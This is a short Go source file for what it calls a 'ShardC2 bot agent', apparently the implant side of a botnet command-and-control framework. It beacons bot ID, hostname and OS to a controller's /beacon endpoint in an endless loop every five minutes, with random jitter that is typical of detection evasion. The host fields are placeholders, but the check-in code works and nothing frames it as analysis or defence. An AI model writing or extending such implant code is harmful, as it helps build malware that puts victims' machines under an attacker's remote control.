package agent

import (
	"bytes"
	"encoding/json"
	"math/rand"
	"net/http"
	"time"
)

// Agent represents a ShardC2 bot agent
type Agent struct {
	ServerURL string
	BotID     string
}

// New creates a new agent instance
func New(serverURL string) *Agent {
	return &Agent{ServerURL: serverURL}
}

type BeaconData struct {
	BotID    string `json:"bot_id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
}

func (a *Agent) Beacon() error {
	data := BeaconData{
		BotID:    a.BotID,
		Hostname: "localhost", // placeholder
		OS:       "linux",     // placeholder
	}
	jsonData, _ := json.Marshal(data)
	resp, err := http.Post(a.ServerURL+"/beacon", "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (a *Agent) StartBeaconing() {
	for {
		a.Beacon()
		jitter := time.Duration(rand.Intn(60)) * time.Second // 0-60s jitter
		time.Sleep(300*time.Second + jitter)                 // beacon every 5min + jitter
	}
}
